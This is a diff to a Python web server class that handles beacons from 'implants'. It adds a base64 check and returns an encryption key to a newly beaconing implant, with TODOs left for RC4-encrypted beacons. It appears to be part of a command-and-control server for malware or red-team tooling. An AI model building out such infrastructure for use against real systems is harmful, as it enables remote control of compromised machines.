@@ -56,15 +56,28 @@ class WebServer(object):
         except Exception:
             raise
 
+    def is_base64(self, string):
+        """
+        Description:
+            This function checks if a specified string is base64 encoded
+        """
+        try:
+            base64.b64decode(string)
+            return True
+
+        except Exception:
+            return False
+
     def beacon_response(self):
         """
-        escription:
+        Description:
             This function is called when an implant beacons
         """
         self.data = request.get_data()
 
-        # tries to base64 decode beacon post data
-        try:
+        # if initial base64 beacon
+        if self.is_base64(self.data) is True:
+            # base64 decodes
             decoded = base64.b64decode(self.data).decode()
 
             # parses json post data
@@ -94,11 +107,10 @@ class WebServer(object):
             # returns base64 encoded encryption key in the http response
             return base64.b64encode(encryption_key.encode())
 
-        # exception means it is an rc4 beacon instead
-        except Exception as e:
+        # else rc4 beacon
+        else:
             # TO DO: SELECT encryption_key FROM implants query here
 
             # TO DO: loop through each queried encryption key and try to decrypt post data (self.data)
 
-            print(str(e))
             return "rc4 beacon"
